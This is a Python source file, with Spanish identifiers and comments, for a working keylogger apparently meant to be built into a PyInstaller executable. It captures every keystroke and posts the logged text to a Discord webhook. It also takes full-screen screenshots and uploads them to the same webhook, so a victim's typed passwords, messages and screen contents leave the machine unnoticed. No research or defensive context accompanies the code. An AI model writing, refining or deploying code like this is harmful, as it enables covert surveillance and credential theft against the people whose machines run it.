import io
import os
import sys
import requests
from dotenv import load_dotenv
from PIL import ImageGrab
from pynput import mouse
from pynput.keyboard import Key, Listener


def ruta_recurso(nombre: str) -> str:
    # Dentro de un .exe hecho con PyInstaller, los recursos se extraen en sys._MEIPASS
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base, nombre)


keys = []
load_dotenv(ruta_recurso(".env"))
WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL")
_numero_reporte = 0
_numero_captura = 0


def enviar_reporte(contenido: str, mensaje: str = "Reporte", nombre_archivo: str = "reporte.txt"): 
    if not WEBHOOK_URL:
            raise RuntimeError("No se encontró la URL del webhook (revisa tu .env)")
    
    if not contenido.strip(): 
        tomar_captura() 
        return 
    
    r = requests.post(
            WEBHOOK_URL,
            data={"content": mensaje},
            files={"file": (nombre_archivo, contenido.encode("utf-8"), "text/plain")},
            timeout=30,
        )
    r.raise_for_status()


def tomar_captura():
    global _numero_captura
    _numero_captura += 1

    imagen = ImageGrab.grab(bbox=None)

    nombre_archivo = f"captura_{_numero_captura}.png"

    buffer = io.BytesIO()
    imagen.save(buffer, format="PNG")
    buffer.seek(0)

    mensaje = f"Captura #{_numero_captura}"

    r = requests.post(
        WEBHOOK_URL,
        data={"content": mensaje},
        files={"file": (nombre_archivo, buffer, "image/png")},
        timeout=30,
    )
    r.raise_for_status()

    return nombre_archivo


def on_press(key):
    global keys

    keys.append(key)

    if key == Key.enter:
        write_file(keys)
        keys = []


def on_click(x, y, boton, presionado):
    print("Evento recibido")
    if presionado:
        print("clic")
        # write_file(keys)


def write_file(keys):
    global _numero_reporte, _numero_captura
    with io.StringIO() as f:
        for key in keys:
            if key == Key.space:
                f.write(" ")

            elif key == Key.enter:
                f.write("'\n'")

            elif key == Key.backspace:
                f.write("[BACKSPACE]")

            elif key == Key.tab:
                f.write("[TAB]")

            elif key == Key.shift:
                f.write("[SHIFT]")

            elif key == Key.shift_r:
                f.write("[SHIFT_R]")

            elif key == Key.ctrl_l:
                f.write("[CTRL_L]")

            elif key == Key.ctrl_r:
                f.write("[CTRL_R]")

            elif key == Key.alt_l:
                f.write("[ALT_L]")

            elif key == Key.alt_r:
                f.write("[ALT_R]")

            elif hasattr(key, "char") and key.char is not None:
                f.write(key.char)

            else:
                f.write("[{0}]".format(key))

            contenido = f.getvalue()

    _numero_reporte += 1
    enviar_reporte(
        contenido,
        mensaje=f"Reporte #{_numero_reporte}",
        nombre_archivo=f"reporte_{_numero_reporte}.txt",
    )


def on_release():
    pass


def click_release():
    pass


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Se está ejecutando...")
with mouse.Listener(on_click=on_click, click_release=click_release) as listener_mouse:
    listener_mouse.join()
